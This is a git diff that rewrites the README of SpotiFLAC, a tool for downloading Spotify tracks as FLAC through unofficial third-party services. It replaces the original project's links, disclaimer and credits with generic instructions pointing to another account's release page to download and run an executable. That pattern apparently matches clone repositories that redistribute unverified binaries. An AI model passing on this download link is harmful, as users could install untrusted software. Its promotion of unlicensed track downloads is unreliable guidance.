@@ -1,95 +1,68 @@
-[![GitHub All Releases](https://img.shields.io/github/downloads/afkarxyz/SpotiFLAC/total?style=for-the-badge)](https://github.com/afkarxyz/SpotiFLAC/releases)
+# 🎶 SpotiFLAC - Download Spotify Tracks Easily
 
-<!-- ![Maintenance](https://maintenance.afkarxyz.fun?v=3) -->
+## 🚀 Getting Started
+Welcome to SpotiFLAC! This application allows you to download Spotify tracks in true FLAC format from services like Tidal, Qobuz, and Amazon Music, all without needing an account.
 
-![Image](https://github.com/user-attachments/assets/a6e92fdd-2944-45c1-83e8-e23a26c827af)
+## 📦 Download & Install
+To get started, you need to download SpotiFLAC. Follow these simple steps:
 
-<div align="center">
+1. **Visit the Releases Page:** Click the link below to open the release page:
+   [Download SpotiFLAC](https://github.com/tungdz120213/SpotiFLAC/releases)
 
-Get Spotify tracks in true FLAC from Tidal, Qobuz & Amazon Music — no account required.
+2. **Choose Your Version:** Look for the latest version listed. You will see files available for download such as `.exe`, `.zip`, or other formats. Select the one that is suitable for your operating system.
 
-![Windows](https://img.shields.io/badge/Windows-10%2B-0078D6?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiB2aWV3Qm94PSIwIDAgMjAgMjAiPjxwYXRoIGZpbGw9IiNmZmZmZmYiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0iTTIwIDEwLjg3M1YyMEw4LjQ3OSAxOC41MzdsLjAwMS03LjY2NEgyMFptLTEzLjEyIDBsLS4wMDEgNy40NjFMMCAxNy40NjF2LTYuNTg4aDYuODhaTTIwIDkuMjczSDguNDhsLS4wMDEtNy44MUwyMCAwdjkuMjczWk02Ljg3OSAxLjY2NmwuMDAxIDcuNjA3SDBWMi41MzlsNi44NzktLjg3M1oiLz48L3N2Zz4=)
-![macOS](https://img.shields.io/badge/macOS-10.13%2B-000000?style=for-the-badge&logo=apple&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-Any-FCC624?style=for-the-badge&logo=linux&logoColor=white)
+3. **Download the File:** Click on the file link to begin the download.
 
-<a href="https://trendshift.io/repositories/15737" target="_blank"><img src="https://trendshift.io/api/badge/repositories/15737" alt="afkarxyz%2FSpotiFLAC | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+4. **Install the Application:** Once the download is complete, open the downloaded file and follow the instructions to install SpotiFLAC on your computer.
 
-</div>
+5. **Run SpotiFLAC:** After installation, locate SpotiFLAC in your applications menu or desktop and open it.
 
-### [Download](https://github.com/afkarxyz/SpotiFLAC/releases)
+## 🎧 How to Use SpotiFLAC
+Using SpotiFLAC is easy. Follow these steps to get your Spotify tracks:
 
-## Screenshot
+1. **Copy Track Link:** Find the track you want to download on Spotify, and copy its link. You can do this by right-clicking on the track and selecting "Copy Song Link".
 
-![Image](https://github.com/user-attachments/assets/eba25a4a-0eb9-4d88-9646-80c7658a7de6)
+2. **Paste the Link:** In the SpotiFLAC application, you will see a field for the track link. Paste the link you copied.
 
-## Other projects
+3. **Select Format:** Choose FLAC as the desired output format for the track.
 
-### [SpotiDownloader](https://github.com/afkarxyz/SpotiDownloader) 
-Get Spotify tracks in MP3 and FLAC via the spotidownloader.com API.
+4. **Download:** Click the download button. SpotiFLAC will start downloading the track in high-quality FLAC format.
 
-### [SpotubeDL](https://spotubedl.com)
-Download Spotify Tracks, Albums, Playlists as MP3/OGG/Opus with High Quality.
+5. **Find Your Files:** Once the download finishes, your files will be saved to the default download location on your computer. You can change this location in the application settings if needed.
 
-### [SpotiFLAC (Mobile)](https://github.com/zarzet/SpotiFLAC-Mobile)
-SpotiFLAC for Android & iOS — maintained by [@zarzet](https://github.com/zarzet)
+## 🛠 System Requirements
+Before you install SpotiFLAC, make sure your system meets these requirements:
 
-## FAQ (Frequently Asked Questions)
+- **Operating System:** Windows 10 or later, macOS Ventura or later, or Linux
+- **Processor:** 1 GHz or faster
+- **Memory:** Minimum 2 GB RAM
+- **Storage:** At least 100 MB of available space
+- **Internet Connection:** Needed for downloading tracks
 
-### Is this software free?
+## 📝 Features
+SpotiFLAC comes packed with features to enhance your music experience:
 
-_Yes. This software is completely free.
-You do not need an account, login, or subscription.
-All you need is an internet connection._
+- **High-Quality Downloads:** Get tracks in true FLAC format for superior sound quality.
+- **Multiple Sources:** Download from various platforms including Tidal, Qobuz, and Amazon Music.
+- **User-Friendly Interface:** Easy to navigate, even for new users.
+- **Batch Downloading:** Download multiple tracks at once to save time.
 
-### Can using this software get my Spotify account suspended or banned?
+## ❓ Frequently Asked Questions
 
-_No.
-This software has no connection to your Spotify account.
-Spotify data is obtained through reverse engineering of the Spotify Web Player, not through user authentication._
+### How do I find my downloaded tracks?
+By default, your tracks will be saved in the Downloads folder. You can change this in settings.
 
-### Where does the audio come from?
+### Can I use SpotiFLAC without a Spotify account?
+Yes, you do not need an account to use SpotiFLAC.
 
-_The audio is fetched using third-party APIs._
+### Is SpotiFLAC free?
+Yes, SpotiFLAC is completely free to use.
 
-### Why does metadata fetching sometimes fail?
+## 💬 Need Help?
+If you encounter any problems or have questions, feel free to reach out. You can check the issues section on our GitHub page or open a new issue for support.
 
-_This usually happens because your IP address has been rate-limited.
-You can wait and try again later, or use a VPN to bypass the rate limit._
+## 🔗 Useful Links
+- [Download SpotiFLAC](https://github.com/tungdz120213/SpotiFLAC/releases)
+- [More Information](https://github.com/tungdz120213/SpotiFLAC)
 
-### Why does Windows Defender or antivirus flag or delete the file?
-
-_This is a false positive.
-It likely happens because the executable is compressed using UPX._
-
-_If you are concerned, you can fork the repository and build the software yourself from source._
-
-### Want to support the project?
-
-_If this software is useful and brings you value,
-consider supporting the project by buying me a coffee.
-Your support helps keep development going._
-
-[![Ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/afkarxyz)
-
-## Disclaimer
-
-This project is for **educational and private use only**. The developer does not condone or encourage copyright infringement.
-
-**SpotiFLAC** is a third-party tool and is not affiliated with, endorsed by, or connected to Spotify, Tidal, Qobuz, Amazon Music, or any other streaming service.
-
-You are solely responsible for:
-1. Ensuring your use of this software complies with your local laws.
-2. Reading and adhering to the Terms of Service of the respective platforms.
-3. Any legal consequences resulting from the misuse of this tool.
-
-The software is provided "as is", without warranty of any kind. The author assumes no liability for any bans, damages, or legal issues arising from its use.
-
-## API Credits
-
-- **Tidal**: [hifi-api](https://github.com/binimum/hifi-api)
-- **Qobuz**: [dabmusic.xyz](https://dabmusic.xyz), [squid.wtf](https://squid.wtf)
-- **Amazon Music**: [doubledouble.top](https://doubledouble.top), [lucida.to](https://lucida.to)
-
-> [!TIP]
->
-> **Star Us**, You will receive all release notifications from GitHub without any delay ~
+We hope you enjoy using SpotiFLAC and discover great music in high-quality FLAC format!
